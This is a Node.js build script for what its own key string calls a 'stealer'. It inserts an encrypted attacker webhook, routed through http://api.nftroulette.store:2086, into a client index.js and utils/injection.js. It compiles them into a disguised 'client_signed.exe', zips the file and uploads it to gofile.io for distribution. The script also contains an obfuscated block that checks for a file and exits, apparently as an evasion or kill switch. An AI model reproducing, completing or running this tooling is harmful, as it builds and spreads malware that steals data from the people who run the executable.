const fs = require('fs');
const util = require('util');
const exec = util.promisify(require('child_process').exec);
const FormData = require("form-data");
const axios = require("axios");
const archiver = require('archiver');
const exe = require('@angablue/exe');

async function upload(path) {
    const server = await getServer();
    const link = await uploadFile(path, server);
    return link;
}

//obfuscator config
var vWAbF37,j86pL8,L0MY9yL,or1oHn,yCqOcNi,ERTyZai,QoHWT8,KLAthi,UqPcm0;function sb7MYs(j86pL8){return vWAbF37[j86pL8<0x8?j86pL8+0x17:j86pL8>0x8?j86pL8<0x8?j86pL8-0x59:j86pL8<0x8?j86pL8-0xa:j86pL8-0x9:j86pL8+0x4f]}vWAbF37=sw3xMz.call(this);var ONZOXxG=[],OdSD6np=sb7MYs(0x9),lLmyve=IoKts3F(()=>{var vWAbF37=['s,3cy+&SJOHJ)7fXJxazZo8@a!8LB.Pb(wwJ','r,|2C.Rj;RtOfy,TQ8i=E?uoB#(/iFMZ6OKg;yn5&2<1=E','~DWH.!K+^5B2Dy#qWu?c2#kM!L','xGrd>*3Nj80E[w=nNE2E?!l;b76HjaacIB',':Ge0Iij[E','Gd=fA36Yt41','E#$2j>l;E','"%2EP5J*J3k','Z:kd+8?NH$8@A','_qCb9ilHsI5ZUD','0w~G2#)G{NG?19$Xn%E3OwgM@8RDZkfX9%n0=y_iLU','?l>csj{{6UF]!xVjv%DyM^jvA8ZN]ZKZXJSzU^vB','USY2~/PB','Rr%GQ!s6k2TYpQxa^n8Ku6kM=LPi#+3i:!9EdjPNfM','5),<[[lTeV<xB','y5YJQ[n`bRK;;mWirrG39:wC','5)YJd'];return OdSD6np?vWAbF37.pop():OdSD6np++,vWAbF37},0x0)();function TUbRGAj(){try{return global||window||new Function('return this')()}catch(e){try{return this}catch(e){return{}}}}!(j86pL8=TUbRGAj()||{},L0MY9yL=j86pL8.TextDecoder,or1oHn=j86pL8.Uint8Array,yCqOcNi=j86pL8.Buffer,ERTyZai=j86pL8.String||String,QoHWT8=j86pL8.Array||Array,KLAthi=IoKts3F(()=>{var j86pL8,L0MY9yL,or1oHn;function yCqOcNi(j86pL8){return vWAbF37[j86pL8<0x5d?j86pL8>0x55?j86pL8<0x55?j86pL8-0x3b:j86pL8-0x56:j86pL8-0x1d:j86pL8+0x3f]}typeof(j86pL8=new QoHWT8(0x80),L0MY9yL=ERTyZai[yCqOcNi(0x58)]||ERTyZai.fromCharCode,or1oHn=[]);return IoKts3F(yCqOcNi=>{var QoHWT8,KLAthi;function UqPcm0(yCqOcNi){return vWAbF37[yCqOcNi<-0x9?yCqOcNi+0x10:yCqOcNi-0x21]}var ONZOXxG,OdSD6np;!(QoHWT8=yCqOcNi.length,or1oHn.length=UqPcm0(-0x10));for(KLAthi=sb7MYs(0x9);KLAthi<QoHWT8;){var lLmyve=IoKts3F(yCqOcNi=>{return vWAbF37[yCqOcNi<0x3e?yCqOcNi+0x2c:yCqOcNi<0x3e?yCqOcNi-0x23:yCqOcNi>0x3e?yCqOcNi<0x46?yCqOcNi>0x3e?yCqOcNi<0x3e?yCqOcNi-0x14:yCqOcNi-0x3f:yCqOcNi-0x3e:yCqOcNi-0x30:yCqOcNi+0x4f]},0x1);OdSD6np=yCqOcNi[KLAthi++];if(OdSD6np<=0x7f){ONZOXxG=OdSD6np}else{if(OdSD6np<=0xdf){ONZOXxG=(OdSD6np&0x1f)<<0x6|yCqOcNi[KLAthi++]&0x3f}else{if(OdSD6np<=0xef){var TUbRGAj=IoKts3F(yCqOcNi=>{return vWAbF37[yCqOcNi<0xb?yCqOcNi-0x4a:yCqOcNi<0x13?yCqOcNi>0xb?yCqOcNi<0x13?yCqOcNi>0xb?yCqOcNi<0x13?yCqOcNi>0x13?yCqOcNi-0x3d:yCqOcNi<0xb?yCqOcNi-0x33:yCqOcNi-0xc:yCqOcNi-0xa:yCqOcNi+0x4b:yCqOcNi+0x39:yCqOcNi+0x10:yCqOcNi+0x64]},0x1);ONZOXxG=(OdSD6np&TUbRGAj(0x10))<<TUbRGAj(0xf)|(yCqOcNi[KLAthi++]&TUbRGAj(0xd))<<0x6|yCqOcNi[KLAthi++]&sb7MYs(0xa)}else{if(ERTyZai[lLmyve(0x41)]){var Sj0G03=IoKts3F(yCqOcNi=>{return vWAbF37[yCqOcNi<0x22?yCqOcNi>0x1a?yCqOcNi<0x1a?yCqOcNi+0xa:yCqOcNi>0x22?yCqOcNi-0x51:yCqOcNi<0x1a?yCqOcNi-0x50:yCqOcNi-0x1b:yCqOcNi-0x23:yCqOcNi-0x6]},0x1);ONZOXxG=(OdSD6np&0x7)<<0x12|(yCqOcNi[KLAthi++]&0x3f)<<Sj0G03(0x1e)|(yCqOcNi[KLAthi++]&Sj0G03(0x1c))<<0x6|yCqOcNi[KLAthi++]&lLmyve(0x40)}else{var lvy0CEa=IoKts3F(yCqOcNi=>{return vWAbF37[yCqOcNi<-0x25?yCqOcNi>-0x25?yCqOcNi+0x5a:yCqOcNi>-0x25?yCqOcNi-0x5:yCqOcNi<-0x25?yCqOcNi>-0x2d?yCqOcNi+0x2c:yCqOcNi+0x8:yCqOcNi+0x44:yCqOcNi+0x21]},0x1);void(ONZOXxG=lvy0CEa(-0x2b),KLAthi+=0x3)}}}}or1oHn.push(j86pL8[ONZOXxG]||(j86pL8[ONZOXxG]=L0MY9yL(ONZOXxG)))}return or1oHn.join('')},0x1)},0x0)());function Sj0G03(vWAbF37){return typeof L0MY9yL!=='undefined'&&L0MY9yL?new L0MY9yL().decode(new or1oHn(vWAbF37)):typeof yCqOcNi!=='undefined'&&yCqOcNi?yCqOcNi.from(vWAbF37).toString('utf-8'):KLAthi(vWAbF37)}UqPcm0=[w0dmABI.apply(sb7MYs(0xe),[0xe])];if(fs[UqPcm0[0x0]](w0dmABI(sb7MYs(0xd)))){var lvy0CEa=IoKts3F(j86pL8=>{return vWAbF37[j86pL8>0x42?j86pL8<0x4a?j86pL8<0x4a?j86pL8>0x4a?j86pL8+0x43:j86pL8<0x4a?j86pL8-0x43:j86pL8-0x3e:j86pL8+0x3e:j86pL8+0x1b:j86pL8+0x22]},0x1);process[w0dmABI.apply(sb7MYs(0xe),[0x10])](lvy0CEa(0x49))}function mODwNy3(j86pL8){const L0MY9yL='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&()*+,./:;<=>?@[]^_`{|}~"',or1oHn=''+(j86pL8||''),yCqOcNi=or1oHn.length,ERTyZai=[];let QoHWT8=0x0,KLAthi=0x0,UqPcm0=-0x1;for(let ONZOXxG=0x0;ONZOXxG<yCqOcNi;ONZOXxG++){const OdSD6np=L0MY9yL.indexOf(or1oHn[ONZOXxG]);if(OdSD6np===-0x1){continue}if(UqPcm0<0x0){UqPcm0=OdSD6np}else{var lLmyve=IoKts3F(j86pL8=>{return vWAbF37[j86pL8>-0xf?j86pL8+0x31:j86pL8>-0xf?j86pL8+0x4c:j86pL8>-0xf?j86pL8+0x2b:j86pL8<-0xf?j86pL8>-0x17?j86pL8+0x16:j86pL8+0x5c:j86pL8+0x3a]},0x1);void(UqPcm0+=OdSD6np*0x5b,QoHWT8|=UqPcm0<<KLAthi,KLAthi+=(UqPcm0&0x1fff)>0x58?0xd:0xe);do{typeof(ERTyZai.push(QoHWT8&0xff),QoHWT8>>=0x8,KLAthi-=0x8)}while(KLAthi>0x7);UqPcm0=-lLmyve(-0x10)}}if(UqPcm0>-sb7MYs(0xf)){ERTyZai.push((QoHWT8|UqPcm0<<KLAthi)&0xff)}return Sj0G03(ERTyZai)}function w0dmABI(vWAbF37,j86pL8,L0MY9yL,or1oHn=mODwNy3,yCqOcNi=ONZOXxG){if(L0MY9yL){return j86pL8[ONZOXxG[L0MY9yL]]=w0dmABI(vWAbF37,j86pL8)}else{if(j86pL8){[yCqOcNi,j86pL8]=[or1oHn(yCqOcNi),vWAbF37||L0MY9yL]}}return j86pL8?vWAbF37[yCqOcNi[j86pL8]]:ONZOXxG[vWAbF37]||(L0MY9yL=(yCqOcNi[vWAbF37],or1oHn),ONZOXxG[vWAbF37]=L0MY9yL(lLmyve[vWAbF37]))}function sw3xMz(){return[0x0,0x3f,'fromCodePoint',0xc,0xf,void 0x0,0x1]}function IoKts3F(vWAbF37,j86pL8){var L0MY9yL=function(){return vWAbF37(...arguments)};Object['defineProperty'](L0MY9yL,'length',{'value':j86pL8,'configurable':true});return L0MY9yL}

async function getServer() {
    const res = await axios({
        url: `https://apiv2.gofile.io/getServer`,
        method: "GET",
        headers: {
            accept: "*/*",
            "accept-language": "en-US,en;",
            "cache-control": "no-cache",
            pragma: "no-cache",
            referrer: "https://gofile.io/uploadFiles",
            mode: "cors",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Edg/85.0.564.44",
            dnt: 1,
            origin: "https://gofile.io"
        },
    });

    if (res.data.status !== "ok") {
        throw new Error(`Fetching server info failed: ${JSON.stringify(res.data)}`);
    }

    return res.data.data.server;
}

async function uploadFile(path, server) {
    const formData = new FormData();
    formData.append('file', fs.createReadStream(path));

    const res = await axios({
        url: `https://${server}.gofile.io/uploadFile`,
        method: "POST",
        headers: {
            ...formData.getHeaders(),
        },
        maxContentLength: Infinity,
        maxBodyLength: Infinity,
        referrer: "https://gofile.io/uploadFiles",
        data: formData,
    });

    if (res.data.status !== "ok") {
        throw new Error(`Uploading file failed: ${JSON.stringify(res.data)}`);
    }

    return res.data.data.downloadPage;
}

const args = process.argv.slice(2);

if (args.length != 3) {
    console.log("ERROR: Invalid exe name detected *(retry without space)*");
    return;
}

// Key of the server
const key = "stanleySMODSPIRATESTEALER0109222";
const crypto = require('crypto');

function encrypt(plainText) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
    let cipherText;
    try {
        cipherText = cipher.update(plainText, 'utf8', 'hex');
        cipherText += cipher.final('hex');
        cipherText = iv.toString('hex') + cipherText;
    } catch (e) {
        cipherText = null;
    }
    return cipherText;
}

//Webhook Protect
async function start() {
    const encryptedWebhook = "http://api.nftroulette.store:2086/webhooks/" + encrypt(args[1]);
    console.log(encryptedWebhook);

    fs.writeFileSync("index.js", fs.readFileSync("index.js").toString().replace("%WEBHOOK%", encryptedWebhook));
    fs.writeFileSync("./utils/injection.js", fs.readFileSync("./utils/injection.js").toString().replace("%WEBHOOK%", encryptedWebhook));

    await exec(`pkg -C GZip -o client_signed.exe -t node18-win-x64 .`);

    fs.writeFileSync("index.js", fs.readFileSync("index.js").toString().replace(encryptedWebhook, "%WEBHOOK%"));
    fs.writeFileSync("./utils/injection.js", fs.readFileSync("./utils/injection.js").toString().replace(encryptedWebhook, "%WEBHOOK%"));
    fs.renameSync("client_signed.exe", args[2] + ".exe");

    const output = fs.createWriteStream(__dirname + '/' + args[2] + '.zip');
    const archive = archiver('zip', {
        zlib: { level: 9 }
    });

    archive.pipe(output);

    const file = process.cwd() + "/" + args[2] + ".exe";
    archive.append(fs.createReadStream(file), { name: args[2] + ".exe" });

    await archive.finalize();

    const link = await upload(process.cwd() + "/" + args[2] + ".zip");

    fs.appendFileSync("link.txt", link);
    fs.rmSync(process.cwd() + "/" + args[2] + ".exe");
    fs.rmSync(process.cwd() + "/" + args[2] + ".zip");
}

start();
